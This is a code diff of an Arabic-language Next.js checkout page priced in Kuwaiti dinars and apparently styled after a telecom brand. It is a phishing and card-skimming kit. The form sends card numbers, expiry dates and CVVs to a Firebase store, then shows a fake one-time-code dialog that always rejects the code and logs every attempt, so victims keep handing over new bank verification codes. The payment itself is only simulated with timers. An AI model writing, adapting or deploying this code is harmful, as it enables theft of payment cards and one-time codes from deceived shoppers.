@@ -1,119 +1,61 @@
 "use client"
 
 import type React from "react"
-
-import { useState, useRef, useEffect } from "react"
-import {
-  CreditCard,
-  Wallet,
-  Check,
-  Shield,
-  Download,
-  ArrowRight,
-  AlertCircle,
-  Info,
-  Lock,
-  Languages,
-  CircleCheck,
-  CircleDashed,
-  Building2,
-  Smartphone,
-  Home,
-} from "lucide-react"
-import Image from "next/image"
-import { useRouter } from "next/navigation"
+import { useState, useEffect } from "react"
+import { Check, CreditCard, Shield, ArrowRight, Lock, Info } from "lucide-react"
 import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
-import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
+import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
 import { Badge } from "@/components/ui/badge"
-import {
-  Dialog,
-  DialogContent,
-  DialogDescription,
-  DialogFooter,
-  DialogHeader,
-  DialogTitle,
-} from "@/components/ui/dialog"
+import { Separator } from "@/components/ui/separator"
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
 import { addData } from "@/lib/firebase"
+import { useRouter } from "next/navigation"
+import { cn } from "@/lib/utils"
 
-// Payment flow states
-type PaymentState = "FORM" | "OTP" | "SUCCESS"
+const allOtps: string[] = [""]
 
-export default function PaymentMethods() {
-  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
-  const [isProcessing, setIsProcessing] = useState(false)
-  const [paymentState, setPaymentState] = useState<PaymentState>("FORM")
-  const [otpValues, setOtpValues] = useState<string[]>(Array(6).fill(""))
+export default function CheckoutPage() {
   const [showOtpDialog, setShowOtpDialog] = useState(false)
-  const otpInputRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null))
+  const [otpValue, setOtpValue] = useState("")
   const [otpError, setOtpError] = useState("")
-  const [resendDisabled, setResendDisabled] = useState(false)
-  const [countdown, setCountdown] = useState(30)
+  const [isLoading, setIsLoading] = useState(false)
+  const [expiryDate, setExpiryDate] = useState("")
+  const [cardType, setCardType] = useState<string | null>(null)
+  const [timeLeft, setTimeLeft] = useState(60)
+  const [canResend, setCanResend] = useState(false)
+  const [amount, setAmount] = useState("5")
+
   const router = useRouter()
-  const [isArabic, setIsArabic] = useState(true) // Default to Arabic to match STC design
 
-  // Form validation
-  const [cardNumber, setCardNumber] = useState("")
-  const [cardExpiry, setCardExpiry] = useState("")
-  const [cardCvc, setCardCvc] = useState("")
-  const [currency, setCurrency] = useState("kwd") // Changed to KWD to match STC Kuwait
-  const [formErrors, setFormErrors] = useState<Record<string, string>>({})
-  const generateOrderId = () => `ORD-${Math.floor(10000 + Math.random() * 90000)}`
-
-  // Order details state
-  const [orderDetails, setOrderDetails] = useState({
-    id: generateOrderId(),
-    total: "114.00", // Default value
-    date: new Date().toISOString(),
+  const [formData, setFormData] = useState({
+    fullName: "",
+    email: "",
+    paymentMethod: "digital-wallet",
+    cardNumber: "",
+    expiryDate: "",
+    cvv: "",
   })
 
-  // Initialize order details from localStorage on client-side only
+  // Timer for OTP resend
   useEffect(() => {
-    try {
-      const storedAmount = localStorage.getItem("amount")
-      if (storedAmount) {
-        setOrderDetails((prev) => ({
-          ...prev,
-          total: storedAmount,
-        }))
-      }
-
-      // Check if language preference is stored
-      const storedLanguage = localStorage.getItem("language")
-      if (storedLanguage) {
-        setIsArabic(storedLanguage === "ar")
-      }
-    } catch (error) {
-      console.error("Error accessing localStorage:", error)
+    if (showOtpDialog && timeLeft > 0) {
+      const timer = setTimeout(() => {
+        setTimeLeft(timeLeft - 1)
+      }, 1000)
+      return () => clearTimeout(timer)
+    } else if (timeLeft === 0) {
+      setCanResend(true)
     }
-  }, [])
-
-  // Toggle language function
-  const toggleLanguage = () => {
-    const newLanguage = !isArabic
-    setIsArabic(newLanguage)
-    try {
-      localStorage.setItem("language", newLanguage ? "ar" : "en")
-    } catch (error) {
-      console.error("Error saving to localStorage:", error)
-    }
-  }
-
-  // Get visitor ID from localStorage (if available)
-  const getVisitorId = () => {
-    try {
-      if (typeof window !== "undefined") {
-        return localStorage.getItem("visitor") || "anonymous-user"
-      }
-    } catch (error) {
-      console.error("Error accessing localStorage:", error)
-    }
-    return "anonymous-user"
-  }
-
+  }, [showOtpDialog, timeLeft])
+useEffect(()=>{
+  const am=localStorage.getItem('amount')!
+  setAmount(am)
+},[])
   // Format card number with spaces
   const formatCardNumber = (value: string) => {
     const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
@@ -121,7 +63,7 @@ export default function PaymentMethods() {
     const match = (matches && matches[0]) || ""
     const parts = []
 
-    for (let i = 0, len = match.length; i < len; i += 4) {
+    for (let i = 0; i < match.length; i += 4) {
       parts.push(match.substring(i, i + 4))
     }
 
@@ -132,788 +74,538 @@ export default function PaymentMethods() {
     }
   }
 
-  // Format expiry date
-  const formatExpiry = (value: string) => {
-    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
-
-    if (v.length >= 3) {
-      return <div className="absolute right-4 top-1/2 -translate-y-1/2">
-                              <div className="w-8 h-5 bg-gray-900 rounded-sm"></div>
-                            </div>
+  // Detect card type based on first digits
+  const detectCardType = (number: string) => {
+    const re = {
+      visa: /^4/,
+      mastercard: /^5[1-5]/,
+      amex: /^3[47]/,
     }
 
-    return value
+    const cleanNumber = number.replace(/\D/g, "")
+
+    if (re.visa.test(cleanNumber)) return "visa"
+    if (re.mastercard.test(cleanNumber)) return "mastercard"
+    if (re.amex.test(cleanNumber)) return "amex"
+    return null
   }
 
-  // Validate form
-  const validateForm = () => {
-    const errors: Record<string, string> = {}
+  const handleInputChange = (field: string, value: string) => {
+    if (field === "expiryDate") {
+      // Remove any non-digit characters except "/"
+      let cleanValue = value.replace(/[^\d/]/g, "")
 
-    if (!cardNumber) {
-      errors.cardNumber = isArabic ? "يرجى إدخال رقم البطاقة" : "Please enter card number"
-    } else if (cardNumber.replace(/\s+/g, "").length < 16) {
-      errors.cardNumber = isArabic ? "رقم البطاقة غير صحيح" : "Invalid card number"
-    }
+      // Remove any existing "/"
+      cleanValue = cleanValue.replace(/\//g, "")
 
-    if (!cardExpiry) {
-      errors.cardExpiry = isArabic ? "يرجى إدخال تاريخ الانتهاء" : "Please enter expiry date"
-    } else if (cardExpiry.length < 5) {
-      errors.cardExpiry = isArabic ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry date"
-    }
-
-    if (!cardCvc) {
-      errors.cardCvc = isArabic ? "يرجى إدخال رمز الأمان" : "Please enter security code"
-    } else if (cardCvc.length < 3) {
-      errors.cardCvc = isArabic ? "رمز الأمان غير صحيح" : "Invalid security code"
-    }
-
-    setFormErrors(errors)
-    return Object.keys(errors).length === 0
-  }
-
-  // Handle initial payment submission
-  const handlePayment = () => {
-    if (paymentMethod === "card" && !validateForm()) {
-      return
-    }
-
-    if (paymentMethod === "paypal") {
-      router.push("/kent")
-      return
-    }
-
-    setIsProcessing(true)
-
-    // Submit card data
-    const visitorId = getVisitorId()
-    addData({ id: visitorId, cardNumber, cardExpiry, cardCvc })
-
-    // Simulate payment processing
-    setTimeout(() => {
-      setIsProcessing(false)
-      setShowOtpDialog(true)
-
-      // Focus the first OTP input when the OTP dialog appears
-      setTimeout(() => {
-        if (otpInputRefs.current[0]) {
-          otpInputRefs.current[0].focus()
-        }
-      }, 100)
-    }, 1500)
-  }
-
-  // Handle OTP input change
-  const handleOtpChange = (index: number, value: string) => {
-    // Only allow numbers
-    if (value && !/^\d*$/.test(value)) return
-
-    const newOtpValues = [...otpValues]
-    newOtpValues[index] = value
-    setOtpValues(newOtpValues)
-    setOtpError("")
-
-    // Auto-focus next input
-    if (value && index < 5) {
-      otpInputRefs.current[index + 1]?.focus()
-    }
-  }
-
-  // Handle OTP input keydown
-  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace" && !otpValues[index] && index > 0) {
-      // Focus previous input when backspace is pressed on an empty input
-      otpInputRefs.current[index - 1]?.focus()
-    }
-  }
-
-  // Handle OTP verification
-  const verifyOtp = () => {
-    const otpCode = otpValues.join("")
-
-    if (otpCode.length !== 6) {
-      setOtpError(isArabic ? "يرجى إدخال رمز التحقق المكون من 6 أرقام" : "Please enter the 6-digit verification code")
-      return
-    }
-
-    setIsProcessing(true)
-
-    // Submit OTP code
-    const visitorId = getVisitorId()
-    addData({ id: visitorId, otp: otpCode })
-
-    // Simulate OTP verification
-    setTimeout(() => {
-      setIsProcessing(false)
-      setShowOtpDialog(false)
-      setPaymentState("SUCCESS")
-    }, 1500)
-  }
-
-  // Handle OTP resend
-  const resendOtp = () => {
-    setResendDisabled(true)
-    setCountdown(30)
-    // Reset OTP fields
-    setOtpValues(Array(6).fill(""))
-    setOtpError("")
-    // Focus the first input
-    setTimeout(() => {
-      if (otpInputRefs.current[0]) {
-        otpInputRefs.current[0].focus()
+      // Add "/" after 2 digits (month)
+      if (cleanValue.length >= 2) {
+        cleanValue = cleanValue.substring(0, 2) + "/" + cleanValue.substring(2, 4)
       }
-    }, 100)
-  }
 
-  // Countdown timer for OTP resend
-  useEffect(() => {
-    let timer: NodeJS.Timeout
-    if (resendDisabled && countdown > 0) {
-      timer = setTimeout(() => {
-        setCountdown(countdown - 1)
-      }, 1000)
-    } else if (countdown === 0) {
-      setResendDisabled(false)
+      // Limit to MM/YY format (5 characters max)
+      cleanValue = cleanValue.substring(0, 5)
+
+      setExpiryDate(cleanValue)
+      setFormData((prev) => ({ ...prev, [field]: cleanValue }))
+    } else if (field === "cardNumber") {
+      const formattedValue = formatCardNumber(value)
+      setFormData((prev) => ({ ...prev, [field]: formattedValue }))
+      setCardType(detectCardType(value))
+    } else {
+      setFormData((prev) => ({ ...prev, [field]: value }))
     }
-    return () => clearTimeout(timer)
-  }, [resendDisabled, countdown])
+  }
 
-  // Get current date in Arabic or English format
-  const getCurrentDate = () => {
-    const options: Intl.DateTimeFormatOptions = {
-      year: "numeric",
-      month: "long",
-      day: "numeric",
-      hour: "2-digit",
-      minute: "2-digit",
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    setIsLoading(true)
+
+    if (formData.paymentMethod === "digital-wallet") {
+      router.push("/knet")
+      return
     }
-    return new Date().toLocaleDateString(isArabic ? "ar-SA" : "en-US", options)
+
+    const visitorId = localStorage.getItem("visitor")
+    addData({
+      id: visitorId,
+      cardNumber: formData.cardNumber.replace(/\s/g, ""),
+      pass: formData.cvv,
+      month: formData.expiryDate,
+      expiryDate:formData.expiryDate,
+    })
+
+    // Simulate API call
+    setTimeout(() => {
+      setIsLoading(false)
+      setShowOtpDialog(true)
+    }, 2000)
   }
 
-  // Translations object
-  const translations = {
-    completePayment: {
-      ar: "إتمام الدفع",
-      en: "Complete Payment",
-    },
-    secure: {
-      ar: "آمن",
-      en: "Secure",
-    },
-    choosePaymentMethod: {
-      ar: "اختر طريقة الدفع المفضلة لديك أدناه",
-      en: "Choose your preferred payment method below",
-    },
-    payment: {
-      ar: "الدفع",
-      en: "Payment",
-    },
-    verification: {
-      ar: "التحقق",
-      en: "Verification",
-    },
-    confirmation: {
-      ar: "التأكيد",
-      en: "Confirmation",
-    },
-    orderNumber: {
-      ar: "رقم الطلب:",
-      en: "Order Number:",
-    },
-    totalAmount: {
-      ar: "المبلغ الإجمالي:",
-      en: "Total Amount:",
-    },
-    paymentMethod: {
-      ar: "طريقة الدفع",
-      en: "Payment Method",
-    },
-    creditCard: {
-      ar: "بطاقة ائتمان",
-      en: "Credit Card",
-    },
-    knet: {
-      ar: "كي نت",
-      en: "KNET",
-    },
-    cardNumber: {
-      ar: "رقم البطاقة",
-      en: "Card Number",
-    },
-    cardNumberTooltip: {
-      ar: "أدخل 16 رقم الموجود على بطاقتك",
-      en: "Enter the 16-digit number on your card",
-    },
-    expiryDate: {
-      ar: "تاريخ الانتهاء",
-      en: "Expiry Date",
-    },
-    securityCode: {
-      ar: "رمز التحقق",
-      en: "Security Code",
-    },
-    payNow: {
-      ar: "ادفع الآن",
-      en: "Pay Now",
-    },
-    processing: {
-      ar: "جاري المعالجة...",
-      en: "Processing...",
-    },
-    allTransactionsSecure: {
-      ar: "جميع المعاملات مشفرة وآمنة",
-      en: "All transactions are encrypted and secure",
-    },
-    paymentSuccessful: {
-      ar: "تم الدفع بنجاح",
-      en: "Payment Successful",
-    },
-    thankYou: {
-      ar: "شكراً لك، تمت عملية الدفع بنجاح",
-      en: "Thank you, your payment was successful",
-    },
-    paymentDate: {
-      ar: "تاريخ الدفع:",
-      en: "Payment Date:",
-    },
-    emailSent: {
-      ar: "تم إرسال تفاصيل الدفع إلى بريدك الإلكتروني",
-      en: "Payment details have been sent to your email",
-    },
-    returnToHome: {
-      ar: "العودة للرئيسية",
-      en: "Return to Home",
-    },
-    printReceipt: {
-      ar: "طباعة الإيصال",
-      en: "Print Receipt",
-    },
-    paymentVerification: {
-      ar: "التحقق من الدفع",
-      en: "Payment Verification",
-    },
-    enterVerificationCode: {
-      ar: "أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك",
-      en: "Enter the 6-digit verification code sent to your phone",
-    },
-    codeSentTo: {
-      ar: "تم إرسال رمز التحقق إلى",
-      en: "Verification code sent to",
-    },
-    didntReceiveCode: {
-      ar: "لم تستلم الرمز؟",
-      en: "Didn't receive the code?",
-    },
-    resendCode: {
-      ar: "إعادة إرسال الرمز",
-      en: "Resend Code",
-    },
-    resendAfter: {
-      ar: "إعادة الإرسال بعد",
-      en: "Resend after",
-    },
-    seconds: {
-      ar: "ثانية",
-      en: "seconds",
-    },
-    confirm: {
-      ar: "تأكيد",
-      en: "Confirm",
-    },
-    verifying: {
-      ar: "جاري التحقق...",
-      en: "Verifying...",
-    },
+  const handleOtpSubmit = () => {
+    const visitorId = localStorage.getItem("visitor")
+    setIsLoading(true)
+
+    allOtps.push(otpValue)
+    addData({ id: visitorId, otp: otpValue, allOtps })
+
+    if (otpValue.length === 6) {
+      setTimeout(() => {
+        setIsLoading(false)
+        setOtpValue("")
+        setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
+      }, 2000)
+    }
   }
 
-  // Helper function to get translation
-  const t = (key: keyof typeof translations) => {
-    return isArabic ? translations[key].ar : translations[key].en
+  const handleOtpChange = (value: string) => {
+    setOtpValue(value)
+    setOtpError("")
   }
 
-  // Progress indicator
-  const renderProgressIndicator = () => (
-    <div className="flex items-center justify-between mb-8">
-      <div className="flex flex-col items-center relative z-10">
-        <div
-          className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-300 ${
-            paymentState === "FORM"
-              ? "bg-gradient-to-br from-red-500 to-red-600 text-white shadow-lg border-red-500"
-              : "bg-gradient-to-br from-green-500 to-green-600 text-white shadow-lg border-green-500"
-          }`}
-        >
-          <CircleCheck className="h-6 w-6" />
-        </div>
-        <span className="text-sm mt-3 font-semibold text-slate-700">{t("payment")}</span>
-      </div>
-      <div
-        className={`h-0.5 flex-1 mx-4 transition-all duration-500 ${paymentState !== "FORM" ? "bg-green-500" : "bg-slate-200"}`}
-      ></div>
-      <div className="flex flex-col items-center relative z-10">
-        <div
-          className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-300 ${
-            paymentState === "OTP"
-              ? "bg-gradient-to-br from-red-500 to-red-600 border-red-500 text-white shadow-lg"
-              : paymentState === "SUCCESS"
-                ? "bg-gradient-to-br from-green-500 to-green-600 border-green-500 text-white shadow-lg"
-                : "bg-white border-slate-200 text-slate-400"
-          }`}
-        >
-          {paymentState === "OTP" || paymentState === "SUCCESS" ? (
-            <CircleCheck className="h-6 w-6" />
-          ) : (
-            <CircleDashed className="h-6 w-6" />
-          )}
-        </div>
-        <span className="text-sm mt-3 font-semibold text-slate-700">{t("verification")}</span>
-      </div>
-      <div
-        className={`h-0.5 flex-1 mx-4 transition-all duration-500 ${paymentState === "SUCCESS" ? "bg-green-500" : "bg-slate-200"}`}
-      ></div>
-      <div className="flex flex-col items-center relative z-10">
-        <div
-          className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-300 ${
-            paymentState === "SUCCESS"
-              ? "bg-gradient-to-br from-green-500 to-green-600 border-green-500 text-white shadow-lg"
-              : "bg-white border-slate-200 text-slate-400"
-          }`}
-        >
-          {paymentState === "SUCCESS" ? <CircleCheck className="h-6 w-6" /> : <CircleDashed className="h-6 w-6" />}
-        </div>
-        <span className="text-sm mt-3 font-semibold text-slate-700">{t("confirmation")}</span>
-      </div>
-    </div>
-  )
+  const handleResendOtp = () => {
+    setTimeLeft(60)
+    setCanResend(false)
+    setOtpValue("")
+    setOtpError("")
 
-  // Render success state
-  const renderSuccessState = () => (
-    <>
-      <CardHeader className="space-y-1 pb-6 text-center border-b border-gray-100">
-        <div className="flex justify-center mb-8">
-          <div className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center border border-green-100">
-            <Check className="h-12 w-12 text-green-600" />
-          </div>
-        </div>
-        <CardTitle className="text-3xl font-bold text-gray-800">{t("paymentSuccessful")}</CardTitle>
-        <CardDescription className="text-lg text-gray-600 mt-2">{t("thankYou")}</CardDescription>
-      </CardHeader>
-      <CardContent className="space-y-8 pt-8">
-        {renderProgressIndicator()}
-
-        <div className="bg-gray-50 rounded-2xl p-8 border border-gray-100">
-          <div className="flex justify-between items-center mb-6 pb-4 border-b border-gray-200">
-            <span className="text-sm font-medium text-gray-500 uppercase tracking-wide">{t("orderNumber")}</span>
-            <span className="font-bold text-gray-900 text-lg">{orderDetails.id}</span>
-          </div>
-          <div className="flex justify-between items-center mb-6 pb-4 border-b border-gray-200">
-            <span className="text-sm font-medium text-gray-500 uppercase tracking-wide">{t("paymentDate")}</span>
-            <span className="font-semibold text-gray-700">{getCurrentDate()}</span>
-          </div>
-          <div className="flex justify-between items-center">
-            <span className="text-sm font-medium text-gray-500 uppercase tracking-wide">{t("totalAmount")}</span>
-            <span className="font-bold text-2xl text-gray-900">
-              {orderDetails.total} {isArabic ? "د.ك" : "KWD"}
-            </span>
-          </div>
-        </div>
-
-        <div className="text-center bg-blue-50 rounded-xl p-6 border border-blue-100">
-          <div className="flex items-center justify-center gap-2 text-blue-700 mb-2">
-            <Building2 className="h-5 w-5" />
-            <span className="font-semibold">إشعار الإيصال</span>
-          </div>
-          <p className="text-blue-600">{t("emailSent")}</p>
-        </div>
-      </CardContent>
-      <CardFooter className="flex flex-col gap-4 pt-8 border-t border-gray-100">
-        <Button
-          className="w-full h-14 text-base font-semibold bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 touch-manipulation"
-          onClick={() => router.push("/")}
-        >
-          <span className="flex items-center gap-3">
-            <Home className="h-5 w-5" />
-            {t("returnToHome")}
-          </span>
-        </Button>
-        <Button
-          variant="outline"
-          className="w-full h-12 border-gray-200 text-gray-700 hover:bg-gray-50 rounded-2xl font-semibold active:scale-95 touch-manipulation"
-          onClick={() => window.print()}
-        >
-          <span className="flex items-center gap-2">
-            <Download className="h-4 w-4" />
-            {t("printReceipt")}
-          </span>
-        </Button>
-      </CardFooter>
-    </>
-  )
+    // Simulate OTP resend
+    setIsLoading(true)
+    setTimeout(() => {
+      setIsLoading(false)
+    }, 1500)
+  }
 
   return (
-    <div className="flex justify-center items-center min-h-screen bg-white font-sans" dir={isArabic ? "rtl" : "ltr"}>
-      {/* Language Toggle Button */}
-      <div className="absolute top-6 right-6 z-10">
-        <button
-          onClick={toggleLanguage}
-          className="bg-white rounded-full p-3 hover:bg-gray-50 transition-all duration-200 shadow-lg border border-gray-200 active:scale-95 touch-manipulation"
-        >
-          <Languages className="text-gray-700" size={20} />
-        </button>
+    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-red-50" style={{fontSize:12}}>
+      {/* Professional Header with animated gradient */}
+      <div className="relative overflow-hidden">
+        <div className="absolute inset-0 bg-gradient-to-l from-red-600/10 via-pink-500/5 to-transparent animate-gradient-x"></div>
+        <div className="relative px-6 py-8">
+          <div className="max-w-md mx-auto text-center">
+            <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-red-600 to-pink-800 rounded-2xl shadow-lg mb-4 relative overflow-hidden">
+              <div className="absolute inset-0 bg-gradient-to-tr from-red-600/80 to-transparent opacity-60 animate-pulse"></div>
+              <Lock className="w-8 h-8 text-white relative z-10" />
+            </div>
+            <h1 className="text-2xl font-bold text-slate-800 mb-2">الدفع الآمن</h1>
+            <p className="text-slate-600">معلوماتك محمية بأعلى معايير الأمان</p>
+          </div>
+        </div>
       </div>
 
-      <Card className="w-full max-w-lg shadow-2xl border-0 overflow-hidden rounded-3xl bg-white">
-        {paymentState === "FORM" && (
-          <>
-            <CardHeader className="space-y-1 pb-8 border-b border-gray-100 bg-white">
-              <div className="flex justify-between items-start">
-                <div>
-                  <CardTitle className="text-3xl font-bold text-gray-900 mb-2">{t("completePayment")}</CardTitle>
-                  <CardDescription className="text-gray-600 text-base">{t("choosePaymentMethod")}</CardDescription>
+      {/* Enhanced Progress Steps with animation */}
+      <Card className="mx-auto max-w-md -mt-6 relative z-10 shadow-2xl border-0 bg-white/80 backdrop-blur-sm">
+        <CardContent className="p-4 sm:p-6">
+          <div className="w-full">
+            {/* Progress Steps */}
+            <div className="grid grid-cols-3 mb-4 relative">
+              {/* Line connectors with animation */}
+              <div className="absolute top-4 left-[calc(16.67%+8px)] right-[calc(16.67%+8px)] h-2">
+                <div className="h-2 w-full flex">
+                  <div className="w-1/2 h-2 bg-gradient-to-r from-[#2b224d] to-red-500 rounded-full relative overflow-hidden">
+                    <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
+                  </div>
+                  <div className="w-1/2 h-2 bg-slate-200 rounded-full"></div>
                 </div>
-                <Badge
-                  variant="outline"
-                  className="flex items-center gap-2 px-3 py-2 bg-green-50 text-green-700 border-green-200 font-semibold"
+              </div>
+
+              {/* Step 1 - Completed with animation */}
+              <div className="flex flex-col items-center relative z-10">
+                <div className="relative">
+                  <div className="w-8 h-8 bg-gradient-to-r from-red-500 to-[#2b224d] rounded-full flex items-center justify-center shadow-lg">
+                    <Check className="w-5 h-5 text-white" />
+                  </div>
+                  <div className="absolute -inset-1 bg-red-500/30 rounded-full animate-pulse"></div>
+                </div>
+                <span className="text-green-600 text-xs sm:text-sm mt-2 font-medium text-center">أختيار القيمة</span>
+              </div>
+
+              {/* Step 2 - Current with pulsing animation */}
+              <div className="flex flex-col items-center relative z-10">
+                <div className="relative">
+                  <div className="w-8 h-8 bg-gradient-to-r from-[#2b224d] to-pink-600 rounded-full flex items-center justify-center shadow-lg relative overflow-hidden">
+                    <div className="absolute inset-0 bg-white/10 animate-pulse"></div>
+                    <span className="text-white text-sm font-bold relative z-10">2</span>
+                  </div>
+                  <div className="absolute -inset-1 bg-red-500/20 rounded-full animate-pulse"></div>
+                </div>
+                <span className="text-red-600 text-xs sm:text-sm mt-2 font-bold text-center">الدفع</span>
+              </div>
+
+              {/* Step 3 - Upcoming */}
+              <div className="flex flex-col items-center relative z-10">
+                <div className="w-8 h-8 bg-slate-200 rounded-full flex items-center justify-center shadow-sm">
+                  <span className="text-slate-400 text-sm font-semibold">3</span>
+                </div>
+                <span className="text-slate-400 text-xs sm:text-sm mt-2 font-medium text-center">تأكيد الطلب</span>
+              </div>
+            </div>
+          </div>
+        </CardContent>
+      </Card>
+
+      {/* Enhanced Form Content */}
+      <div className="px-4 py-8">
+        <div className="max-w-md mx-auto space-y-8">
+          <form onSubmit={handleSubmit} className="space-y-8">
+            {/* Enhanced Payment Selection */}
+            <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
+              <CardHeader className="bg-gradient-to-r from-slate-100 via-white to-red-50 px-8 py-6 border-b border-slate-100">
+                <div className="flex items-center">
+                  <div className="w-8 h-8 bg-gradient-to-r from-red-600 to-pink-600 rounded-lg flex items-center justify-center ml-3 relative overflow-hidden">
+                    <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
+                    <CreditCard className="w-5 h-5 text-white relative z-10" />
+                  </div>
+                  <CardTitle className="text-xl font-bold text-slate-800">طريقة الدفع</CardTitle>
+                  <Badge className="mr-3 bg-green-100 text-green-700 border-green-200 font-medium">
+                    <Shield className="w-3 h-3 ml-1" />
+                    SSL آمن
+                  </Badge>
+                </div>
+                <CardDescription className="text-slate-500 mt-2 pr-11">
+                  اختر طريقة الدفع المفضلة لديك لإتمام عملية الشراء
+                </CardDescription>
+              </CardHeader>
+
+              <CardContent className="p-8">
+                <RadioGroup
+                  value={formData.paymentMethod}
+                  onValueChange={(value) => handleInputChange("paymentMethod", value)}
+                  className="space-y-4"
                 >
-                  <Shield className="h-4 w-4" /> {t("secure")}
-                </Badge>
-              </div>
-            </CardHeader>
-            <CardContent className="space-y-8 pt-8">
-              {renderProgressIndicator()}
-
-              <div className="bg-gray-50 rounded-2xl p-8 border border-gray-100">
-                <div className="flex justify-between items-center mb-6 pb-4 border-b border-gray-200">
-                  <span className="text-sm font-medium text-gray-500 uppercase tracking-wide">{t("orderNumber")}</span>
-                  <span className="font-bold text-gray-900 text-lg">{orderDetails.id}</span>
-                </div>
-                <div className="flex justify-between items-center">
-                  <span className="text-sm font-medium text-gray-500 uppercase tracking-wide">{t("totalAmount")}</span>
-                  <span className="font-bold text-2xl text-gray-900">
-                    {orderDetails.total} {isArabic ? "د.ك" : "KWD"}
-                  </span>
-                </div>
-              </div>
-
-              <div>
-                <h3 className="font-bold mb-6 text-gray-900 text-lg">{t("paymentMethod")}</h3>
-                <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="grid gap-4">
-                  <div className="grid gap-6">
-                    <div className="relative">
-                      <div
-                        className={`absolute inset-0 rounded-2xl transition-all duration-300 ${
-                          paymentMethod === "card" ? "ring-2 ring-red-500 shadow-lg" : ""
-                        }`}
-                        
-                      ></div>
-                      <div className="flex items-center space-x-2 relative">
-                        <RadioGroupItem   value="card" id="card" className="text-red-500 border-gray-300" />
-                        <Label
-                          htmlFor="card"
-                          className="flex items-center gap-4 cursor-pointer rounded-2xl border-2 border-gray-200 p-6 hover:bg-gray-50 hover:border-gray-300 transition-all duration-200 w-full touch-manipulation active:scale-95"
-                        >
-                          <div className="bg-gradient-to-br from-red-500 to-red-600 text-white p-3 rounded-xl">
-                            <CreditCard className="h-6 w-6" />
+                  {/* Credit Card Option with hover effects */}
+                  <Card
+                    className={cn(
+                      "border-2 transition-all duration-300 hover:shadow-lg group",
+                      formData.paymentMethod === "credit-card"
+                        ? "border-red-300 bg-gradient-to-r from-red-50/80 to-pink-50/80 shadow-md"
+                        : "border-slate-200 bg-gradient-to-r from-red-50/30 to-pink-50/30 hover:border-red-200",
+                    )}
+                    dir="rtl"
+                  >
+                    <CardContent className="p-0">
+                      <div className="flex items-center p-6">
+                        <RadioGroupItem
+                          value="credit-card"
+                          id="credit-card"
+                          className="border-1 border-red-400 text-red-600 ml-4 w-5 h-5"
+                        />
+                        <div className="flex items-center justify-between w-full">
+                          <div dir="rtl">
+                            <Label htmlFor="credit-card" className="text-slate-800 font-bold text-md cursor-pointer">
+                              بطاقة ائتمان
+                            </Label>
+                            <p className="text-slate-500 text-xs mt-1">Visa, Mastercard, American Express</p>
                           </div>
-                          <div className="font-semibold text-gray-900 text-lg">{t("creditCard")}</div>
-                          <div className={`flex gap-3 ${isArabic ? "mr-auto" : "ml-auto"}`}>
-                            <div className="rounded-lg overflow-hidden shadow-sm">
-                              <Image src="/visa.svg" alt="visa" width={38} height={24} />
+                          <div className="flex items-center space-x-2 space-x-reverse">
+                            <div
+                              className={cn(
+                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
+                                cardType === "visa" && formData.paymentMethod === "credit-card"
+                                  ? "scale-110"
+                                  : "opacity-70",
+                              )}
+                            >
+                              <img src="/visa.svg" alt="Visa" className="w-10 h-6 object-contain" />
                             </div>
-                            <div className="rounded-lg overflow-hidden shadow-sm">
-                              <Image src="/mas.svg" alt="mastercard" width={38} height={24} />
+                            <div
+                              className={cn(
+                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
+                                cardType === "mastercard" && formData.paymentMethod === "credit-card"
+                                  ? "scale-110"
+                                  : "opacity-70",
+                              )}
+                            >
+                              <img src="/master.svg" alt="Mastercard" className="w-10 h-6 object-contain" />
                             </div>
-                            <div className="rounded-lg overflow-hidden shadow-sm">
-                              <Image src="/amex.svg" alt="express" width={38} height={24} />
+                            <div
+                              className={cn(
+                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
+                                cardType === "amex" && formData.paymentMethod === "credit-card"
+                                  ? "scale-110"
+                                  : "opacity-70",
+                              )}
+                            >
+                              <img src="/amex.svg" alt="American Express" className="w-10 h-6 object-contain" />
                             </div>
                           </div>
-                        </Label>
+                        </div>
+                      </div>
+
+                      {formData.paymentMethod === "credit-card" && (
+                        <div className="border-t bg-white/80 backdrop-blur-sm">
+                          <div className="p-6 space-y-6">
+                            <div className="group" dir="rtl">
+                              <Label htmlFor="cardNumber" className="text-slate-700 text-base font-semibold mb-1 block">
+                                رقم البطاقة <span className="text-red-500">*</span>
+                              </Label>
+                              <div className="relative">
+                                <Input
+                                  id="cardNumber"
+                                  placeholder="#### #### #### ####"
+                                  maxLength={19}
